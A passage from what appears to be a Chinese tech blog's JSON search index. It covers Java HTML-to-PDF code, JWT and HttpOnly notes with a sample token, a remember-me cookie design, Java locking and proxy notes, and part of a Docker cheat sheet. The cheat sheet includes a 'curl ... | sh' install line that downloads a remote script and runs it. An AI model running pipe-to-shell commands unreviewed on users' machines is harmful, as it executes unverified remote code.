class=&quot;na&quot;&gt;printStackTrace&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ByteArrayOutputStream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ByteArrayOutputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;renderer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setDocumentFromString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;htmlStr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;renderer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;layout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;renderer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;createPDF&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;DocumentException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;printStackTrace&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toByteArray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt; } public static void main(String[] args) throws IOException { Html2Pdf html2Pdf = new Html2Pdf(); &lt;span class=&quot;nc&quot;&gt;ClassLoader&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;classLoader&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;html2Pdf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClassLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;htmlFile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;classLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getResource&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;html/htmlTest1.html&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;htmlStr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;FileUtils&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;readFileToString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;htmlFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; //  byte[] content = html2Pdf.convert(&quot;&lt;html&gt;&lt;body&gt;test pdf&lt;/body&gt;&lt;/html&gt;&quot;); byte[] content = html2Pdf.convert(htmlStr);  &lt;span class=&quot;nc&quot;&gt;FileOutputStream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fstream&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;BufferedOutputStream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;test.pdf&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;fstream&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;FileOutputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;BufferedOutputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fstream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;IOException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;printStackTrace&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;finally&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; //  IOUtils.closeQuietly(fstream);  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;IOException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;printStackTrace&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fstream&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;fstream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;IOException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;printStackTrace&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; } html &lt;html xmlns=http://www.w3.org/1999/xhtml&gt; &lt;head&gt;  &lt;meta http-equiv=Content-Type content=text/html; charset=utf-8/&gt;  &lt;title&gt;合同&lt;/title&gt;  &lt;style type=text/css&gt;  body {font-family: SimSun;}  @page{size:210mm,297mm}  &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;table border=1 cellspacing=0 cellpadding=0&gt;  &lt;tr&gt;  &lt;td rowspan=2&gt;项目单位基本信息&lt;/td&gt;  &lt;td colspan=2&gt;项目单位名称&lt;/td&gt;  &lt;td colspan=2&gt;地址&lt;/td&gt;  &lt;td colspan=2&gt;Telephone&lt;/td&gt;  &lt;/tr&gt; &lt;/table&gt; &lt;/body&gt; &lt;/html&gt; build.gradle buildscript {  text {  t tspringBootVersion = '1.5.9.RELEASE'  t}  trepositories {  t tmavenCentral()  t}  tdependencies {  t tclasspath(&quot;org.springframework.boot:spring-boot-gradle-plugin:${springBootVersion}&quot;)  t} } apply plugin: 'java' apply plugin: 'eclipse' apply plugin: 'org.springframework.boot' group = 'com.stone.tool' version = '0.0.1-SNAPSHOT' sourceCompatibility = 1.8 repositories { mavenCentral() } dependencies { compile('org.springframework.boot:spring-boot-starter') compile('org.xhtmlrenderer:flying-saucer-pdf:9.0.8') compile('com.itextpdf:itext-asian:5.2.0') compile('com.itextpdf:itextpdf:5.4.3') compile 'org.apache.commons:commons-io:1.3.2' testCompile('org.springframework.boot:spring-boot-starter-test') } ",
      "url"      : "http://localhost:4000/2018/01/03/html2pdf/"
    } ,
  
    {
      "title"    : "Httponly",
      "category" : "",
      "content": "JWT / HttpOnly JWT Json Web Token,代替cookie session,解决CSRF（Cross Site Request Forge）。包括header,payload，签名,存储在客户端Loal Storage中。 header = '{&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;}' payload = '{&quot;loggedInAs&quot;:&quot;admin&quot;,&quot;iat&quot;:1422779638}'//iat表示令牌生成的时间 key = 'secretkey' unsignedToken = encodeBase64(header) + '.' + encodeBase64(payload) signature = HMAC-SHA256(key, unsignedToken) token = encodeBase64(header) + '.' + encodeBase64(payload) + '.' + encodeBase64(signature) token看起来像这样: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsb2dnZWRJbkFzIjoiYWRtaW4iLCJpYXQiOjE0MjI3Nzk2Mzh9.gzSraSYS8EXBxLN_oWnFSRgCzcmJmMjLiuyu5CSpyHI http header Authorization: Bearer eyJhbGci*...&lt;snip&gt;...*yu5CSpyHI HttpOnly cookie头中一个属性，避免CSS（Cross Site Script).JS不能读取Cookie, 只能服务端读。e ",
      "url"      : "http://localhost:4000/2018/02/04/httponly/"
    } ,
  
    {
      "title"    : "Es Db Compare",
      "category" : "",
      "content": "ES/DB 概念 数据库/Elastic Search ",
      "url"      : "http://localhost:4000/2018/03/06/es-db-compare/"
    } ,
  
    {
      "title"    : "Oracle Mysql",
      "category" : "",
      "content": "Oracle/Mysql 概念 数据库/schema ",
      "url"      : "http://localhost:4000/2018/03/06/oracle-mysql/"
    } ,
  
    {
      "title"    : "Sleuth Zipkin",
      "category" : "",
      "content": "sleuth &amp; zipkin sleuth Spring Cloud Sleuth (org.springframework.cloud:spring-cloud-starter-sleuth), once added to the CLASSPATH, automatically instruments common communication channels: requests over messaging technologies like Apache Kafka or RabbitMQ (or any other Spring Cloud Stream binder HTTP headers received at Spring MVC controllers requests that pass through a Netflix Zuul microproxy requests made with the RestTemplate, etc. Spring Cloud Sleuth sets up useful log formatting for you that prints the trace ID and the span ID. zipkin Data collection is a start but the goal is to understand the data, not just collect it. In order to appreciate the big picture, we need to get beyond individual events. For this we’ll use the OpenZipkin project. OpenZipkin is the fully open-source version of Zipkin, a project that originated at Twitter in 2010, and is based on the Google Dapper papers. ",
      "url"      : "http://localhost:4000/2018/03/28/sleuth-zipkin/"
    } ,
  
    {
      "title"    : "Http Remember Me",
      "category" : "",
      "content": "web页面rememberMe功能实现 参考 Spring Security 持久化login cookie 服务端DB存储 To summarize Miller's design（老外2006年的文章，服！） When the user successfully logs in with Remember Me checked, a login cookie is issued in addition to the standard session management cookie. The login cookie contains the user's username and a random number (the &quot;token&quot; from here on) from a suitably large space. The username and token are stored as a pair in a database table. When a non-logged-in user visits the site and presents a login cookie, the username and token are looked up in the database. If the pair is present, the user is considered authenticated. The used token is removed from the database. A new token is generated, stored in database with the username, and issued to the user via a new login cookie. If the pair is not present, the login cookie is ignored. Users that are only authenticated via this mechanism are not permitted to access certain protected information or functions such as changing a password, viewing personally identifying information, or spending money. To perform those operations, the user must first successfully submit a normal username/password login form. Since this approach allows the user to have multiple remembered logins from different browsers or computers, a mechanism is provided for the user to erase all remembered logins in a single operation. 存在的问题 任然存在login cookie被盗用的风险（rememberMe过期时间内）。受害用户登陆时提示重新登陆一般会以为是过期，不会注意曾经被盗用过。（提示上次登陆时间是个不错的方法，帮助用户发现风险） 上面场景一种可能的解决方案是：受害者登陆时服务端如果发现login cookie无效，那么认为先前的login cookie（包括现在所有的）都不安全，存在被盗用的风险。提示用户并invalid当前所有该用户的 login cookie。缺点是存在DOS攻击风险。 优化方案 这里关健是识别盗用和非法访问DOS攻击的场景。方案中增加了一个series id，相对token来说不变（token只一次有效）。在未验证通过场景时如果series id正确说明是盗用；如果未提供series id说明是互联网DOS攻击或者随机调用。 The implementation is no more difficult and requires no more resources than Miller's design. From the summary above, only items 2 and 3 change: When the user successfully logs in with Remember Me checked, a login cookie is issued in addition to the standard session management cookie. The login cookie contains the user's username, a series identifier, and a token. The series and token are unguessable random numbers from a suitably large space. All three are stored together in a database table. When a non-logged-in user visits the site and presents a login cookie, the username, series, and token are looked up in the database. If the triplet is present, the user is considered authenticated. The used token is removed from the database. A new token is generated, stored in database with the username and the same series identifier, and a new login cookie containing all three is issued to the user. If the username and series are present but the token does not match, a theft is assumed. The user receives a strongly worded warning and all of the user's remembered sessions are deleted. If the username and series are not present, the login cookie is ignored. 客户端Cookie存储（hash加密） 服务端成功验证后返回浏览器下面的cookie。启用rememberMe功能再次访问服务端时，服务端在过期时间内验证hash签名（用户名+过期时间+密码+key）。过期时间内cookie有被盗用的风险。 base64(username + &quot;:&quot; + expirationTime + &quot;:&quot; + md5Hex(username + &quot;:&quot; + expirationTime + &quot;:&quot; password + &quot;:&quot; + key)) username:  As identifiable to the UserDetailsService password:  That matches the one in the retrieved UserDetails expirationTime: The date and time when the remember-me token expires, expressed in milliseconds key:   A private key to prevent modification of the remember-me token ",
      "url"      : "http://localhost:4000/2018/03/31/http-remember-me/"
    } ,
  
    {
      "title"    : "Reactor",
      "category" : "",
      "content": "reactor组件 组件描述 Initiation Dispatcher 管理（注册，删除，回调）event handler， Synchronous Event Demultiplexer IO多路分发器，epoll/select Handle socket, NIO Channel Event Handler accept,read,write事件处理 Concrete Event Handler ",
      "url"      : "http://localhost:4000/2018/04/07/reactor/"
    } ,
  
    {
      "title"    : "Java Synchronized",
      "category" : "",
      "content": "java锁机制 乐观锁/悲观锁 java中的乐观锁主要有自旋锁、轻量级锁与偏向锁，基本都是通过CAS操作实现的 java中的悲观锁就是Synchronized,AQS框架下的锁则是先尝试cas乐观锁去获取锁，获取不到，才会转换为悲观锁，如RetreenLock markword对象头 状态 标志位 存储内容  未锁定 01 对象哈希码、对象分代年龄 轻量级锁定 00 指向锁记录的指针 膨胀(重量级锁定) 10 执行重量级锁定的指针 GC标记 11 空(不需要记录信息) 可偏向 01 偏向线程ID、偏向时间戳、对象分代年龄  偏向锁 -XX:+UseBiasedLocking -XX:BiasedLockingStartupDelay=0 自旋锁 轻量锁（先自旋） 重量锁（synchronized） Contention List：竞争队列，所有请求锁的线程首先被放在这个竞争队列中； Entry List：Contention List中那些有资格成为候选资源的线程被移动到Entry List中； Wait Set：哪些调用wait方法被阻塞的线程被放置在这里； OnDeck：任意时刻，最多只有一个线程正在竞争锁资源，该线程被成为OnDeck； Owner：当前已经获取到锁资源的线程被称为Owner； synchronized的执行过程： 检测Mark Word里面是不是当前线程的ID，如果是，表示当前线程处于偏向锁 如果不是，则使用CAS将当前线程的ID替换Mard Word，如果成功则表示当前线程获得偏向锁，置偏向标志位1 如果失败，则说明发生竞争，撤销偏向锁，进而升级为轻量级锁。 当前线程使用CAS将对象头的Mark Word替换为锁记录指针，如果成功，当前线程获得锁 如果失败，表示其他线程竞争锁，当前线程便尝试使用自旋来获取锁。 如果自旋成功则依然处于轻量级状态。 如果自旋失败，则升级为重量级锁。 偏向锁是在无锁争用的情况下使用的，也就是同步代码执行时没有其它线程会执行该同步块。一旦有了第二个线程的争用，偏向锁就会升级为轻量级锁。如果轻量级锁自旋到达阈值后，没有获取到锁，就会升级为重量级锁； ",
      "url"      : "http://localhost:4000/2018/04/14/java-synchronized/"
    } ,
  
    {
      "title"    : "Java Dynamic Proxy",
      "category" : "",
      "content": "Java动态代理 ASM： ASM 是一个底层的Java字节码生成工具。它能够以二进制形式修改已有类或者动态生成类。ASM 可以直接产生二进制 class 文件，也可以在类被加载入 Java 虚拟机之前动态改变类行为。ASM 从类文件中读入信息后，能够改变类行为，分析类信息，甚至能够根据用户要求生成新类。 不过ASM在创建class字节码的过程中，操纵的级别是底层JVM的汇编指令级别，这要求ASM使用者要对class组织结构和JVM汇编指令有一定的了解。 Javassist Javassist是一个开源的分析、编辑和创建Java字节码的类库。是由东京工业大学的数学和计算机科学系的 Shigeru Chiba （千叶滋）所创建的。它已加入了开放源代码JBoss 应用服务器项目,通过使用Javassist对字节码操作为JBoss实现动态AOP框架。javassist是jboss的一个子项目，其主要的优点，在于简单，而且快速。直接使用java编码的形式，而不需要了解虚拟机指令，就能动态改变类的结构，或者动态生成类。 CGLIB（类继承） CGLIB（Code Generation Library），是一个强大的，高性能，高质量的Code生成类库，它可以在运行期扩展Java类与实现Java接口(类继承)。 cglib 创建某个类A的动态代理类的模式是： 查找A上的所有非final 的public类型的方法定义； 将这些方法的定义转换成字节码； 将组成的字节码转换成相应的代理的class对象； 实现 MethodInterceptor接口，用来处理 对代理类上所有方法的请求（这个接口和JDK动态代理InvocationHandler的功能和角色是一样的） JDK的动态代理（接口） InvocationHandler/Proxy public static Object newProxyInstance(ClassLoader loader,       Class&lt;?&gt;[] interfaces,       InvocationHandler h)  throws IllegalArgumentException { &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; public interface InvocationHandler {  public Object invoke(Object proxy, Method method, Object[] args)  throws Throwable; } 总结 JDK动态代理创建速度优于CGLIB动态代理，但是在函数的调用性能上远不如CGLIB和Javassist。故CGLIB和Javassist整体性能上比JDK动态代理好。Javassist字节码最快，CGLIB次之，是JDK的两倍。 另外Aspectj不能算动态代理，应该是静态代理，因为它采用的是编译器植入。用aspectj，需要写相应的xml，定义切面，织入点等，然后由aspectj的编译器来编译出新的字节码文件，这明显是静态代理。 ",
      "url"      : "http://localhost:4000/2018/04/15/java-dynamic-proxy/"
    } ,
  
    {
      "title"    : "Java Off Heap Memory",
      "category" : "",
      "content": "Java堆外内存 Java可以通过设置-XX:MaxDirectMemorySize=10M控制堆外内存的大小 NIO ByteBuffer JDK NIO的ByteBuffer类提供了一个接口allocateDirect(int capacity)进行堆外内存的申请，底层通过unsafe.allocateMemory(size)实现 ByteBuffer.allocateDirect分配的堆外内存不需要我们手动释放，而且ByteBuffer中也没有提供手动释放的API。也即是说，使用ByteBuffer不用担心堆外内存的释放问题，除非堆内存中的ByteBuffer对象由于错误编码而出现内存泄露。 Unsafe Unsafe allocateMemory和freeMemory，相当于C语音中的malloc和free，必须手动释放分配的内存。 引用Unsafe的java对象是在堆内存中分配的，当该对象被垃圾回收的时候，并不会释放堆外内存。因为使用Unsafe获取的堆外内存，必须由程序显示的释放，JVM不会帮助我们做这件事情。可以覆写Object.finalize()，当堆中的对象即将被垃圾回收器释放的时候，会调用该对象的finalize。 ",
      "url"      : "http://localhost:4000/2018/04/15/java-off-heap-memory/"
    } ,
  
    {
      "title"    : "Docker Cheat Sheet",
      "category" : "",
      "content": "Docker Cheat Sheet Want to improve this cheat sheet? See the Contributing section! Table of Contents Why Docker Prerequisites Installation Containers Images Networks Registry and Repository Dockerfile Layers Links Volumes Exposing Ports Best Practices Security Tips Contributing Why Docker &quot;With Docker, developers can build any app in any language using any toolchain. “Dockerized” apps are completely portable and can run anywhere - colleagues’ OS X and Windows laptops, QA servers running Ubuntu in the cloud, and production data center VMs running Red Hat. Developers can get going quickly by starting with one of the 13,000+ apps available on Docker Hub. Docker manages and tracks changes and dependencies, making it easier for sysadmins to understand how the apps that developers build work. And with Docker Hub, developers can automate their build pipeline and share artifacts with collaborators through public or private repositories. Docker helps developers build and ship higher-quality applications, faster.&quot; -- What is Docker Prerequisites I use Oh My Zsh with the Docker plugin for autocompletion of docker commands. YMMV. Linux The 3.10.x kernel is the minimum requirement for Docker. MacOS 10.8 “Mountain Lion” or newer is required. Installation Linux Quick and easy install script provided by Docker: curl -sSL https://get.docker.com/ | sh If you're not willing to run a random shell script, please see the installation instructions for your distribution. If you are a complete Docker newbie, you should follow the series of tutorials now. Mac OS X Download and install Docker Toolbox. Docker For Mac is nice, but it's not quite as finished as the VirtualBox install. See the comparison. NOTE If you have an existing docker toolbox, you might think you can upgrade Docker Machine binaries directly (either from URL or docker-machine upgrade default) and it will take care of itself. This is not going to help -- docker-machine will be 1.10.3 while docker is still 1.8.3 or whatever your previous version is. You are much better off using Docker Toolbox DMG file to upgrade, which will take care of all the binaries at once. Once you've installed Docker Toolbox, install a VM with Docker Machine using the VirtualBox provider: docker-machine create --driver=virtualbox default docker-machine ls eval &quot;$(docker-machine env default)&quot; Then start up a container: docker run hello-world That's it, you have a running Docker container. If you are a complete Docker newbie, you should probably follow the series of tutorials now. Containers Your basic isolated Docker process. Containers are to Virtual Machines as threads are to processes. Or you can think of them as chroots on steroids. Lifecycle docker create creates a container but does not start it. docker rename allows the container to be renamed. docker run creates and starts a container in one operation. docker rm deletes a container. docker update updates a container's resource limits. Normally if you run a container without options it will start and stop immediately, if you want keep it running you can use the command, docker run -td container_id this will use the option -t that will allocate a pseudo-TTY session and -d that will detach automatically the container (run container in background and print container ID). If you want a transient container, docker run --rm will remove the container after it stops. If you want to map a directory on the host to a docker container, docker run -v $HOSTDIR:$DOCKERDIR. Also see Volumes. If you want to remove also the volumes associated with the container, the deletion of the container must include the -v switch like in docker rm -v. There's also a logging driver available for individual containers in docker 1.10. To run docker with a custom log driver (i.e., to syslog), use docker run --log-driver=syslog. Another useful option is docker run --name yourname docker_image because when you specify the --name inside the run command this will allow you to start and stop a container by calling it with the name the you specified when you created it. Starting and Stopping docker start starts a container so it is running. docker stop stops a running container. docker restart stops and starts a container. docker pause pauses a running container, &quot;freezing&quot; it in place. docker unpause will unpause a running container. docker wait blocks until running container stops. docker kill sends a SIGKILL to a running container. docker attach will connect to a running container. If you want to integrate a container with a host process manager, start the daemon with -r=false then use docker start -a. If you want to expose container ports through the host, see the exposing ports section. Restart policies on crashed docker instances are covered here. CPU Constraints You can limit CPU, either using a percentage of all CPUs, or by using specific cores. For example, you can tell the cpu-shares setting. The setting is a bit strange -- 1024 means 100% of the CPU, so if you want the container to take 50% of all CPU cores, you should specify 512. See https://goldmann.pl/blog/2014/09/11/resource-management-in-docker/#_cpu for more: docker run -ti --c 512 agileek/cpuset-test You can also only use some CPU cores using cpuset-cpus. See https://agileek.github.io/docker/2014/08/06/docker-cpuset/ for details and some nice videos: docker run -ti --cpuset-cpus=0,4,6 agileek/cpuset-test Note that Docker can still see all of the CPUs inside the container -- it just isn't using all of them. See https://github.com/docker/docker/issues/20770 for more details. Memory Constraints You can also set memory constraints on Docker: docker run -it -m 300M ubuntu:14.04 /bin/bash Capabilities Linux capabilities can be set by using cap-add and cap-drop. See https://docs.docker.com/engine/reference/run/#/runtime-privilege-and-linux-capabilities for details. This should be used for greater security. To mount a FUSE based filesystem, you need to combine both --cap-add and --device: docker run --rm -it --cap-add SYS_ADMIN --device /dev/fuse sshfs Give access to a single device: docker run -it --device=/dev/ttyUSB0 debian bash Give access to all devices: docker run -it --privileged -v /dev/bus/usb:/dev/bus/usb debian bash more info about privileged containers here Info docker ps shows running containers. docker logs gets logs from container. (You can use a custom log driver, but logs is only available for json-file and journald in 1.10). docker inspect looks at all the info on a container (including IP address). docker events gets events from container. docker port shows public facing port of container. docker top shows running processes in container. docker stats shows containers' resource usage statistics. docker diff shows changed files in the container's FS. docker ps -a shows running and stopped containers. docker stats --all shows a running list of containers. Import / Export docker cp copies files or folders between a container and the local filesystem. docker export turns container filesystem into tarball archive stream to STDOUT. Executing Commands docker exec to execute a command in container. To enter a running container, attach a new shell process to a running container called foo, use: docker exec -it foo /bin/bash. Images Images are just templates for docker containers. Lifecycle docker images shows all images. docker import creates an image from a tarball. docker build creates image from Dockerfile. docker commit creates image from a container, pausing it temporarily if it is running. docker rmi removes an image. docker load loads an image from a tar archive as STDIN, including images and tags (as of 0.7). docker save saves an image to a tar archive stream to STDOUT with all parent layers, tags &amp; versions (as of 0.7). Info docker history shows history of image. docker tag tags an image to a name (local or registry). Cleaning up While you can use the docker rmi command to remove specific images, there's a tool called docker-gc that will clean up images that are no longer used by any containers in a safe manner. Load/Save image Load an image from file: docker load &lt; my_image.tar.gz Save an existing image: docker save my_image:my_tag | gzip &gt; my_image.tar.gz Import/Export container Import a container as an image from file: cat my_container.tar.gz | docker import - 